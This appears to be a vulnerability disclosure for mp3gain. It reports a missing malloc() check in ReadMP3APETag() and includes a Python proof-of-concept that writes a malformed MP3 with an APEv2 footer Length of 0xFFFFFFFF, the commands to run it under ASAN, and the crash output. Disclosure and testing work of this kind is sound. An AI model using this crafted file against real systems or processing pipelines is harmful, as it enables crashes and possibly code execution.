## Bug0: Heap Buffer Overflow Due to Missing malloc() Return Check in ReadMP3APETag

In `ReadMP3APETag()` in `apetag.c` at lines 171-175, the return value of `malloc(TagLen)` is never checked for NULL before being passed to `fread()`, and because `TagLen` is taken directly from the attacker-controlled APEv2 footer `Length` field with no upper-bound validation, supplying `Length=0xFFFFFFFF` causes ASAN to return a minimal sentinel buffer whose bounds are immediately overflowed by the subsequent `fread` or `memcpy`, resulting in a heap-buffer-overflow crash.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC Generator: heap-buffer-overflow via missing malloc() check in ReadMP3APETag()
Function: ReadMP3APETag() in apetag.c, lines 171-175
"""

import struct

OUTPUT = "poc_input.mp3"

# Minimal fake MPEG1 Layer3 frame (128kbps, 44100Hz, stereo) — 417 bytes each
FRAME_SYNC = bytes([0xFF, 0xFB])
FRAME_HDR_REST = bytes([0x90, 0x00])
FRAME_SIZE = 417
FRAME_DATA = FRAME_SYNC + FRAME_HDR_REST + bytes(FRAME_SIZE - 4)

# 4 fake MP3 frames so mp3gain opens and scans the file
NUM_FRAMES = 4
mp3_body = FRAME_DATA * NUM_FRAMES

# APEv2 Footer structure (32 bytes):
#   ID       : 8 bytes  "APETAGEX"
#   Version  : 4 bytes LE  2000 (APEv2)
#   Length   : 4 bytes LE  0xFFFFFFFF  <- triggers malloc failure / overflow
#   ItemCount: 4 bytes LE  0
#   Flags    : 4 bytes LE  0
#   Reserved : 8 bytes     0x00

APE_ID       = b"APETAGEX"
APE_VERSION  = struct.pack("<I", 2000)
APE_LENGTH   = struct.pack("<I", 0xFFFFFFFF)
APE_COUNT    = struct.pack("<I", 0)
APE_FLAGS    = struct.pack("<I", 0)
APE_RESERVED = bytes(8)

ape_footer = APE_ID + APE_VERSION + APE_LENGTH + APE_COUNT + APE_FLAGS + APE_RESERVED
assert len(ape_footer) == 32

malicious_mp3 = mp3_body + ape_footer

with open(OUTPUT, "wb") as f:
    f.write(malicious_mp3)

print(f"[+] Written {len(malicious_mp3)} bytes to {OUTPUT}")
print(f"[+] APE footer Length = 0xFFFFFFFF -> triggers malloc() failure / heap-buffer-overflow")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==15195==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000050 at pc 0x55f3ba4e0408 bp 0x7fffa0a75e40 sp 0x7fffa0a75e30
SUMMARY: AddressSanitizer: heap-buffer-overflow in ReadMP3APETag
==14525==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000031 at pc 0x7f0ac5dab397 bp 0x7ffc02310b20 sp 0x7ffc023102c8
SUMMARY: AddressSanitizer: heap-buffer-overflow in __interceptor_memcpy

### Impact

An attacker who supplies a crafted MP3 file with an APEv2 footer whose `Length` field is set to `0xFFFFFFFF` can trigger a heap-buffer-overflow in `ReadMP3APETag()`, corrupting heap memory in a way that can lead to denial of service via process crash or, under favorable heap layout conditions, to arbitrary code execution. This attack surface is exposed to any invocation of mp3gain on an untrusted file, including automated batch-processing pipelines where the tool is run without user interaction. Without ASAN the unchecked NULL returned by `malloc()` is passed directly to `fread()`, causing a reliable NULL-pointer dereference segmentation fault that unconditionally crashes the process.
